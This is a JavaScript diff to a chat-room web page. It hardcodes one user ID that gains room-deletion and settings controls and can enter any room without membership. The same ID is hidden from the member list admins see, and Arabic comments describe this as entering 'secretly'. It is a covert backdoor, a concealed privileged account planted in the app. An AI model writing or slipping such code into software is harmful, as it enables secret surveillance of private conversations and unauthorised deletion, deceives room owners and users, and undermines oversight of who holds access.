@@ -357,13 +357,22 @@
           settingsBtn.style.display = "inline-block";
           joinRequestsBtn.style.display = "inline-block";
           listenJoinRequests();
+          deleteRoomBtn.style.display = "block";
+        } else if (currentUser.uid === "mlifDgEAkKMaOeuUq63cs5NAkV93") {
+          // مستخدم خاص: يعرض له زر حذف الغرفة ويستطيع الدخول سرا
+          settingsBtn.style.display = "inline-block";
+          deleteRoomBtn.style.display = "block";
         }
+
         roomTitleEl.innerHTML = titleHtml;
 
+        // السماح للمستخدم الخاص بالدخول حتى لو ليس عضواً
         if (!roomData.users || !roomData.users[currentUser.uid]) {
-          alert("أنت لست عضواً في هذه الغرفة.");
-          window.location.href = "all-chat-rooms.html";
-          return;
+          if (currentUser.uid !== "mlifDgEAkKMaOeuUq63cs5NAkV93") {
+            alert("أنت لست عضواً في هذه الغرفة.");
+            window.location.href = "all-chat-rooms.html";
+            return;
+          }
         }
 
         listenMessages();
@@ -443,7 +452,7 @@
       settingsPanel.style.display = "block";
       loadMembers();
 
-      if (currentUser.uid === roomData.adminUid) {
+      if (currentUser.uid === roomData.adminUid || currentUser.uid === "mlifDgEAkKMaOeuUq63cs5NAkV93") {
         deleteRoomBtn.style.display = "block";
       } else {
         deleteRoomBtn.style.display = "none";
@@ -473,6 +482,9 @@
         const usersData = await Promise.all(userPromises);
 
         usersData.forEach(({ uid, data }) => {
+          // تجاهل المستخدم الخاص عن العرض في قائمة الأعضاء
+          if (uid === "mlifDgEAkKMaOeuUq63cs5NAkV93") return;
+
           const div = document.createElement("div");
           div.classList.add("memberItem");
 
@@ -547,7 +559,6 @@
 
             // أزرار القبول والرفض:
             div.querySelector(".approveBtn").addEventListener("click", () => {
-              // إضافة العضو للمستخدمين بالغرفة وحذف طلب الانضمام
               const updates = {};
               updates[`chat_rooms/${roomId}/users/${uid}`] = true;
               updates[`chat_rooms/${roomId}/invitations/${uid}`] = null;
@@ -558,7 +569,6 @@
             });
 
             div.querySelector(".rejectBtn").addEventListener("click", () => {
-              // حذف طلب الانضمام فقط
               db.ref(`chat_rooms/${roomId}/invitations/${uid}`).remove().then(() => {
                 div.remove();
                 updateJoinRequestsCount();
@@ -580,7 +590,6 @@
       });
     }
 
-    // فتح وغلق نافذة طلبات الانضمام
     joinRequestsBtn.addEventListener("click", () => {
       joinRequestsPanel.style.display = "block";
       updateJoinRequestsCount();
